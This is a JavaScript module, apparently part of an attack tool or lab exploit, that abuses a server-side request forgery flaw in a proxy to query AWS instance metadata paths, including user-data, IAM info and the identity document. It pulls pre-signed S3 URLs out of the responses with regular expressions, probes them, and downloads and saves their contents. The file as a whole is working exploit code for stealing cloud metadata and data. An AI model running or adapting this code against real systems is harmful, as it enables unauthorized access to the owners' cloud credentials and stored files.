import axios from "axios";
import { CONFIG } from "./config.js";
import {
  logInfo,
  logSuccess,
  logError,
  logWarning,
  logSeparator,
  log,
} from "./utils.js";

const METADATA_PATHS = [
  "/latest/user-data",
  "/latest/meta-data/iam/info",
  "/latest/meta-data/instance-id",
  "/latest/meta-data/hostname",
  "/latest/meta-data/local-hostname",
  "/latest/dynamic/instance-identity/document",
];

export async function discoverPresignedURLs(proxyUrl, token) {
  logInfo("Searching for pre-signed URLs in IMDS metadata...");
  logSeparator();

  const discoveredURLs = [];
  const metadataContent = {};

  for (const path of METADATA_PATHS) {
    try {
      const metadataUrl = `${CONFIG.imdsv2.baseUrl}${path}`;
      const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${metadataUrl}`;

      log(`Checking: ${path}...`, null, "dim");

      const response = await axios.get(fullUrl, {
        headers: {
          [CONFIG.imdsv2.headers.tokenRequest]: token,
        },
        timeout: 5000,
      });

      if (response.data) {
        const content = typeof response.data === "string" ? response.data : JSON.stringify(response.data);
        metadataContent[path] = content;

        const s3Urls = extractS3URLs(content);
        if (s3Urls.length > 0) {
          logSuccess(`Found ${s3Urls.length} S3 URL(s) in ${path}`);
          discoveredURLs.push(...s3Urls.map(url => ({ url, source: path })));
        }
      }
    } catch (error) {
      log(`  Not available or empty`, null, "dim");
    }
  }

  logSeparator();

  if (discoveredURLs.length === 0) {
    logWarning("No pre-signed URLs found in standard IMDS paths");
    logInfo("Attempting to enumerate custom metadata paths...");

    try {
      const metadataUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/`;
      const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${metadataUrl}`;

      const response = await axios.get(fullUrl, {
        headers: {
          [CONFIG.imdsv2.headers.tokenRequest]: token,
        },
      });

      if (response.data) {
        logInfo("Available metadata paths:");
        console.log(response.data);
      }
    } catch (error) {
    }

    logSeparator();
    return { urls: [], metadata: metadataContent };
  }

  logSuccess(`Discovered ${discoveredURLs.length} potential S3 URL(s)!`);
  logSeparator();

  return { urls: discoveredURLs, metadata: metadataContent };
}

export function extractS3URLs(content) {
  const urls = [];

  const patterns = [
    /https?:\/\/[a-z0-9.-]+\.s3[a-z0-9.-]*\.amazonaws\.com\/[^\s"'<>]+[?&]X-Amz-Signature=[a-f0-9]+[^\s"'<>]*/gi,
    /https?:\/\/s3[a-z0-9.-]*\.amazonaws\.com\/[a-z0-9.-]+\/[^\s"'<>]+[?&]X-Amz-Signature=[a-f0-9]+[^\s"'<>]*/gi,

    /https?:\/\/[a-z0-9.-]+\.s3[a-z0-9.-]*\.amazonaws\.com\/[^\s"'<>]+\?[^\s"'<>]+/gi,
    /https?:\/\/s3[a-z0-9.-]*\.amazonaws\.com\/[a-z0-9.-]+\/[^\s"'<>]+\?[^\s"'<>]+/gi,

    /https?:\/\/[a-z0-9.-]+\.s3[a-z0-9.-]*\.amazonaws\.com\/[^\s"'<>]+/gi,
    /https?:\/\/s3[a-z0-9.-]*\.amazonaws\.com\/[a-z0-9.-]+\/[^\s"'<>]+/gi,

    /arn:aws:s3:::[a-z0-9.-]+[^\s"'<>]*/gi,
  ];

  for (const pattern of patterns) {
    const matches = content.match(pattern);
    if (matches) {
      urls.push(...matches);
    }
  }

  return [...new Set(urls)];
}

export async function testPresignedURLs(discoveredURLs) {
  if (discoveredURLs.length === 0) {
    return [];
  }

  logInfo("Testing discovered S3 URLs...");
  logSeparator();

  const workingURLs = [];

  for (const { url, source } of discoveredURLs) {
    try {
      log(`Testing: ${url}`, null, "cyan");

      const response = await axios.head(url, {
        timeout: 10000,
        maxRedirects: 5,
        validateStatus: (status) => status < 500, // Accept 2xx, 3xx, 4xx
      });

      if (response.status === 200) {
        logSuccess(`✓ URL is accessible! (HTTP ${response.status})`);

        const contentType = response.headers['content-type'] || 'unknown';
        const contentLength = response.headers['content-length'] || 'unknown';

        log(`  Content-Type: ${contentType}`, null, "green");
        log(`  Content-Length: ${contentLength} bytes`, null, "green");
        log(`  Source: ${source}`, null, "dim");

        workingURLs.push({
          url,
          source,
          contentType,
          contentLength,
          status: response.status,
        });

        try {
          const contentResponse = await axios.get(url, {
            timeout: 10000,
            maxRedirects: 5,
          });

          if (contentResponse.data) {
            log(`  Content:`, null, "yellow");
            const content = typeof contentResponse.data === 'string'
              ? contentResponse.data
              : JSON.stringify(contentResponse.data);
            console.log(`    ${content}`);
          }
        } catch (downloadError) {
          log(`  Could not download content`, null, "dim");
        }

        logSeparator();
      } else if (response.status === 403) {
        logWarning(`✗ URL returned 403 Forbidden (might be expired or restricted)`);
      } else if (response.status === 404) {
        log(`✗ URL returned 404 Not Found`, null, "dim");
      } else {
        log(`? URL returned HTTP ${response.status}`, null, "yellow");
      }
    } catch (error) {
      if (error.code === 'ENOTFOUND' || error.code === 'ECONNREFUSED') {
        log(`✗ URL is not accessible (connection failed)`, null, "dim");
      } else if (error.response?.status === 403) {
        logWarning(`✗ URL returned 403 Forbidden`);
      } else {
        log(`✗ Error testing URL: ${error.message}`, null, "dim");
      }
    }
  }

  logSeparator();

  if (workingURLs.length > 0) {
    logSuccess(`Found ${workingURLs.length} accessible S3 URL(s)!`);
    logSeparator();
  } else {
    logWarning("No accessible S3 URLs found");
    logSeparator();
  }

  return workingURLs;
}

export async function downloadS3Content(url, outputPath = null) {
  try {
    logInfo(`Downloading content from: ${url}`);

    const response = await axios.get(url, {
      timeout: 30000,
      maxRedirects: 5,
    });

    if (outputPath) {
      const fs = await import('fs');
      fs.writeFileSync(outputPath,
        typeof response.data === 'string' ? response.data : JSON.stringify(response.data, null, 2)
      );
      logSuccess(`Content saved to: ${outputPath}`);
    }

    return response.data;
  } catch (error) {
    logError(`Failed to download content: ${error.message}`);
    return null;
  }
}

export function displayMetadata(metadata) {
  logInfo("IMDS Metadata Summary:");
  logSeparator();

  for (const [path, content] of Object.entries(metadata)) {
    log(`${path}:`, null, "cyan");
    console.log(`  ${content}`);
    console.log();
  }

  logSeparator();
}
